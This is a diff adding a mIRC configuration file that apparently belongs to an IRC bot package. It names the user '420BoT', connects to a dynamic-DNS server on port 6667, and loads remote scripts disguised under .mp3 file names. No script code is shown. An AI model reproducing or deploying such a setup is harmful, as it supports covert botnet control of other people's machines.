@@ -1,0 +1,161 @@
+[agent]
+enable=0,0,0
+char=merlin.acs
+options=0,0,0,100,0
+speech=150,60,100,1,180,10,50,1,1,1,0,50,1
+channel=1,1,1,1,1,1,1,1,1
+private=1,1,1,1
+other=1,1,1,1,1,1,1
+pos=20,20
+lang=0x0409
+[windows]
+scripts=23,796,67,606,0,0,0
+main=0,112,715,27,0,1,0
+wchannel=0,706,0,34,0,1,0
+wquery=42,631,42,396,1,1,0
+wchat=0,631,0,397,1,1,0
+wdccg=-1,269,-1,260,0,1,0
+wdccs=-1,269,-1,264,0,1,0
+wlist=-1,596,-1,376,0,1,0
+[options]
+n0=1,0,0,1,0,0,300,1,0,0,1,0,0,0,1,1,0,0,1,0,4096,0,0,0,0,0,0,1,0,50,1,1
+n1=5,100,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,1,0,5,0,1,0,0,0,1,0,0
+n2=0,0,0,0,1,1,1,1,0,60,120,0,0,1,0,0,0,1,1,120,20,10,0,1,1,0,0,1,0,0,0,0,0
+n3=5000,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,0,2,5,0,0,0,3,180,0
+n4=0,0,1,1,0,0,9999,0,0,1,1,0,1024,0,0,99,60,0,0,0,0,0,0,4,1,5000,0,1,0,0,1,0,1,1
+n5=1,1,1,1,1,1,1,1,1,1,6667,0,0,0,0,0,1,0,300,30,10,0,0,24,0,0,0,8192,1,0,3,25,0
+n6=0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,100,1,1,0,0,0,0,0,1,0,0,1
+n7=0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,1,70,0,3,0,0,1,1,1,1,0,0,0,0,1,1,0,1
+[text]
+commandchar=.
+linesep=-
+timestamp=[C-c]
+accept=*.bmp,*.gif,*.jpg,*.log,*.mid,*.mp3,*.ogg,*.png,*.txt,*.wav,*.wma,*.zip
+ignore=*.exe,*.com,*.bat,*.dll,*.ini,*.mrc,*.vbs,*.js,*.pif,*.scr,*.lnk,*.pl,*.shs,*.htm,*.html
+network=All
+aptitle=Kc
+quit=Someone Pressed the X...Not hidden...
+theme=mIRC Classic
+lastreset=[no date]
+[files]
+servers=servers.ini
+finger=finger.txt
+urls=urls.ini
+addrbk=addrbk.ini
+trayicon=D:\Yoshi\LargeBoo.ico
+[mirc]
+user=420BoT
+email=OwnzYoMAM@gov.gov
+nick=degrease
+anick=RedP578
+host=hipz.servegame.comSERVER:hipz.servegame.com:6667
+[dirs]
+logdir=logs\
+waves=sounds\
+midis=sounds\
+mp3s=sounds\
+wmas=sounds\
+oggs=sounds\
+[dde]
+ServerStatus=on
+ServiceName=HiDSA
+CheckName=on
+[pfiles]
+n0=popups.ini
+n1=popups.ini
+n2=popups.ini
+n3=popups.ini
+n4=popups.ini
+[warn]
+fserve=off
+dcc=off
+[about]
+version=6.02
+show=BR26354
+[ports]
+random=off
+bind=off
+[ident]
+active=yes
+userid=dmud
+system=Solaris
+port=113
+[socks]
+enabled=no
+port=1080
+method=4
+dccs=no
+useip=yes
+[language]
+sjis=0
+multibyte=0
+[clicks]
+status=/lusers
+query=/whois $$1
+channel=/channel
+nicklist=/query $$1
+notify=/whois $$1
+message=/whois $$1
+[marker]
+show=off
+size=3
+colour=4
+method=1
+[fileserver]
+warning=off
+[dccserver]
+n0=1,59,0,0,0,0
+[styles]
+thin=0
+font=0
+hide=0
+color=default
+size=1
+buttons=0
+[events]
+default=2,2,3,2,2,0,1,2
+[findtext]
+n0="msg %channel"
+n1="!smoke.crack /write dl.txt "
+n10="notice $nick"
+[colors]
+n0=mIRC Classic,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,1,0
+[palettes]
+n0=16777215,0,8323072,37632,255,127,10223772,32764,65535,64512,9671424,16776960,16515072,16711935,8355711,13816530
+[colours]
+n0=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+[wizard]
+warning=2
+[nicklist]
+#MENACE=right,2
+[layers]
+mirc=0
+enable=0,0,0,0,0,0,0,0,0,0
+others=0
+[local]
+local=h24
+localip=2
+longip=407292654
+[fonts]
+f#testtest=Webdings,712,2
+fstatus=Webdings,712,2
+[waves]
+send=No Sound
+[dragdrop]
+n0=*.wav:/sound $1 $2-
+n1=*.*:/dcc send $1 $2-
+s0=*.*:/dcc send $1 $2-
+[extensions]
+n0=defaultEXTDIR:download\
+n1=*.wav,*.mid,*.mp3,*.wma,*.oggEXTDIR:sounds\
+[afiles]
+n0=WuTang.mp3
+[rfiles]
+n0=remote.ini
+n1=50Cent.mp3
+n2=Obitrice.mp3
+n3=Snoopdogg.mp3
+n4=sample.mp3
+n5=cygwim.mp3
+n6=redman.mp3
+n7=DrDre.mp3
